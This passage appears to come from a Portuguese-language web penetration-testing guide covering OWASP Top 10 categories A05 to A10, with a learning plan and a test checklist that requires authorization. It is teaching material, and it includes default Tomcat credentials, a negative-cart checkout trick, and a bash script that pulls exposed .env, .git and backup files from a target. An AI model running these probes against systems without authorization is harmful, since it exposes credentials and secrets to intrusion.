# Efeito: Subtrai do preço total
# Carrinho: -$10 (refund!)

# Checkout com carrinho negativo
# Resultado: Ganhar dinheiro em vez de pagar!
```

---

## A05 - SECURITY MISCONFIGURATION {#a05}

### 📌 Resumo Executivo

**Criticidade:** 🔴🔴 ALTA
**CVSS Score:** 6.5 - 7.5
**Prevalência:** 73% dos testes
**Impacto:** Information disclosure, RCE

---

### 🔧 Tipos de Misconfiguration

**1. Default Credentials**
```
Tomcat:
  URL: http://localhost:8080/manager
  User: tomcat
  Password: tomcat

Resultado: Admin acesso sem mudar padrão
```

**2. Verbose Error Messages**
```
❌ BAD:
Error: mysql_query() expects at least 2 parameters, 1 given in /var/www/html/index.php on line 42

Expõe: Path do arquivo, versão MySQL, line number

✓ GOOD:
Error: Database error occurred
```

**3. Debug Mode Ativo**
```
Flask:
app.run(debug=True)

Django:
DEBUG = True  # Em produção!

Resultado: Stack traces, environment, source code
```

**4. Diretório Listing Ativo**
```
GET /uploads/

Resposta:
-rw-r--r--  config.php
-rw-r--r--  backup.sql
-rw-r--r--  admin_panel.html

Todos os arquivos visíveis!
```

---

### 💻 PoC - Enumerando Misconfiguration

```bash
#!/bin/bash

TARGET="http://app.local"

echo "[*] Testando Security Misconfiguration"

# Test 1: Directory listing
curl -v "$TARGET/uploads/" | grep -i "index of"

# Test 2: Common default pages
for page in admin manager phpmyadmin wp-admin cpanel; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$page/")
  echo "[$status] /$page/"
done

# Test 3: Backup files
for ext in .bak .old .backup .sql .tar.gz; do
  for file in backup index database config; do
    curl -s -o /dev/null -w "[$file$ext: %{http_code}]\n" "$TARGET/$file$ext"
  done
done

# Test 4: Git exposure
curl -s "$TARGET/.git/config" | head -20

# Test 5: SVN exposure
curl -s "$TARGET/.svn/wc.db" | strings | head -20

# Test 6: Environment files
curl -s "$TARGET/.env"
curl -s "$TARGET/.env.production"
curl -s "$TARGET/.env.local"

# Test 7: Debug endpoints
curl -s "$TARGET/debug/"
curl -s "$TARGET/__debug__/"
curl -s "$TARGET/swagger"
```

---

## A06 - VULNERABLE AND OUTDATED COMPONENTS {#a06}

### 📌 Resumo Executivo

**Criticidade:** 🔴🔴 ALTA
**CVSS Score:** 7.0 - 9.0
**Prevalência:** 80% de apps
**Impacto:** RCE, DoS, Data breach

---

### 💻 PoC - Identificar Componentes Vulneráveis

```bash
#!/bin/bash

# Identify technologies
whatweb http://target.com

# Check Node.js versions
curl -s http://target:3000 -H "User-Agent: test" | grep -i version

# Test known CVEs
nuclei -u http://target -t /path/to/nuclei-templates/vulnerabilities/

# Software Composition Analysis
npm audit              # Node.js
pip check              # Python
mvn dependency:check   # Java
```

---

Continuando com A07-A10...

## A07 - AUTHENTICATION FAILURES {#a07}

### 📌 Resumo Executivo

**Criticidade:** 🔴🔴 ALTA
**CVSS Score:** 7.5 - 9.8
**Prevalência:** 65% encontram
**Impacto:** Account takeover, data access

---

## A08 - SOFTWARE AND DATA INTEGRITY FAILURES {#a08}

### 📌 Resumo Executivo

**Criticidade:** 🔴🔴 ALTA
**CVSS Score:** 7.5 - 9.1
**Prevalência:** Crescente
**Impacto:** Malware, supply chain

---

## A09 - LOGGING AND MONITORING FAILURES {#a09}

### 📌 Resumo Executivo

**Criticidade:** 🔴 MÉDIA
**CVSS Score:** 6.0 - 8.5
**Prevalência:** 90% sem logs adequados
**Impacto:** Detecção fraca

---

## A10 - SERVER-SIDE REQUEST FORGERY (SSRF) {#a10}

### 📌 Resumo Executivo

**Criticidade:** 🔴🔴 ALTA
**CVSS Score:** 7.1 - 9.0
**Prevalência:** 15% dos testes
**Impacto:** Acesso a sistemas internos, RCE

---

## 📊 Tabela Comparativa - OWASP Top 10

| # | Vulnerabilidade | Criticidade | Exploração | Detecção | Remediação |
|---|-----------------|----------|-----------|----------|-----------|
| **A01** | Broken Access | ⭐⭐⭐⭐⭐ | Fácil | Fácil | Média |
| **A02** | Cryptographic | ⭐⭐⭐⭐⭐ | Fácil | Média | Média |
| **A03** | Injection | ⭐⭐⭐⭐⭐ | Fácil | Fácil | Fácil |
| **A04** | Insecure Design | ⭐⭐⭐⭐⭐ | Médio | Difícil | Difícil |
| **A05** | Misconfiguration | ⭐⭐⭐⭐ | Fácil | Fácil | Fácil |
| **A06** | Old Components | ⭐⭐⭐⭐ | Fácil | Fácil | Fácil |
| **A07** | Auth Failures | ⭐⭐⭐⭐ | Médio | Fácil | Fácil |
| **A08** | Integrity | ⭐⭐⭐⭐ | Médio | Difícil | Média |
| **A09** | Logging | ⭐⭐⭐ | - | - | Fácil |
| **A10** | SSRF | ⭐⭐⭐⭐ | Médio | Médio | Média |

---

## 🎯 Metodologia de Teste Progressiva

### Iniciante (Semanas 1-4)

```
Semana 1: A03 (Injection)
├─ SQL Injection basic
├─ Command Injection
└─ Exploração com SQLMap

Semana 2: A01 (Access Control)
├─ IDOR enumeration
├─ Horizontal escalation
└─ Broken auth endpoints

Semana 3: A05 (Misconfiguration)
├─ Default credentials
├─ Directory listing
└─ Debug modes

Semana 4: A07 (Auth)
├─ Brute force
├─ Session fixation
└─ Password reset flaws
```

### Intermediário (Semanas 5-12)

```
A02: Cryptographic failures
A04: Insecure design
A06: Vulnerable components
A08: Integrity failures
A09: Logging failures
A10: SSRF
```

### Avançado (Meses 3-6)

```
Combinação de vulnerabilidades
Exploração em cadeia
Bypass de proteções (WAF, MFA)
Exploração de fluxo de negócio
```

---

## 📋 Checklist Final - Teste Completo

```
PRÉ-TESTE:
[ ] Escopo definido e autorização assinada
[ ] Ambiente de teste preparado (lab)
[ ] Ferramentas testadas
[ ] Relatório template pronto
[ ] Rules of engagement entendidas

FASE 1: RECONNAISSANCE
[ ] Google dorking completo
[ ] Subdomínios enumerados
[ ] Tecnologia identificada
[ ] Certificado analisado
[ ] Wayback machine consultada

FASE 2: SCANNING
[ ] Nmap full port scan
[ ] Vulnerability scan (Nessus/ZAP)
[ ] WAF detection
[ ] CMS identification

FASE 3: OWASP TOP 10 TESTING
[ ] A01: IDOR, horizontal/vertical escalation
[ ] A02: Weak crypto, plaintext transmission
[ ] A03: SQL, Command, XPath injection
[ ] A04: Business logic bypass
[ ] A05: Default creds, verbose errors
[ ] A06: Component analysis (SCA)
[ ] A07: Brute force, session mgmt
[ ] A08: Deserialization, integrity
[ ] A09: Logging adequacy
[ ] A10: SSRF, internal access

FASE 4: EXPLORAÇÃO
[ ] PoC criado para cada vulnerability
[ ] Impacto validado
[ ] Cadeia de exploit testada

FASE 5: DOCUMENTAÇÃO
[ ] Screenshots coletadas
[ ] Curl commands salvos
[ ] Relatório estruturado
[ ] Recomendações documentadas

PÓS-TESTE:
[ ] Cleanup (reset de dados modificados)
[ ] Relatório entregue
[ ] Debriefing realizado
[ ] Achados priorizados
```

---

<div align="center">

**⭐ Comece por A01, A03 e A05**

**Master progressivamente cada categoria**

**Documente tudo para portfolio**

**Do iniciante ao expert: Pratica consistente**

</div>
